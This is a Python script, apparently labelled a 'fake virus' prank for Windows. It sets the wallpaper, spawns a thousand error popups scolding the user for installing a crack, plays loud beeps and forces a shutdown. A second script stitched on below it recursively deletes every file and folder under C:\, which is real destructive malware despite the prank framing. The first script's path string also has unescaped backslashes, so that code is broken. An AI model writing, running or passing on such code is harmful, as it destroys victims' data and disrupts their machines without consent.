import ctypes
import os
import tkinter as tk
from tkinter import messagebox
import winsound
import subprocess

def change_wallpaper(image_path):
    if not os.path.exists(image_path):
        return

    try:
        ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 3)
        for _ in range(1000): 
            show_message("Warning", "Why did you install a crack?!")
        print("#ctypes:1000")
    except Exception as e:
        show_message("Error", f"Failed to change wallpaper: {e}")
        
def shutdown_pc():
    winsound.Beep(11111, 100000)  
    winsound.Beep(7000, 100000)  
    print("YOUR PC WAS HACKED LOL HAHAH")
    subprocess.run("shutdown /s /t 20", shell=True) 
def show_message(title, message):
    root = tk.Tk()
    root.withdraw()  
    messagebox.showerror(title, message) 

image_path = "C:\Users\WDAGUtilityAccount\Downloads\FAKE-VIRUS-main (2).zip\FAKE-VIRUS-main/" 

change_wallpaper(image_path)
shutdown_pc()
import os
import shutil

def delete_all_files(directory):
    for foldername, subfolders, filenames in os.walk(directory, topdown=False):
        for filename in filenames:
            try:
                file_path = os.path.join(foldername, filename)
                os.remove(file_path)
                print(f"Deleted file: {file_path}")
            except Exception as e:
                print(f"Failed to delete {file_path}: {e}")

        for subfolder in subfolders:
            try:
                folder_path = os.path.join(foldername, subfolder)
                shutil.rmtree(folder_path)
                print(f"Deleted folder: {folder_path}")
            except Exception as e:
                print(f"Failed to delete {folder_path}: {e}")


delete_all_files("C:\\")
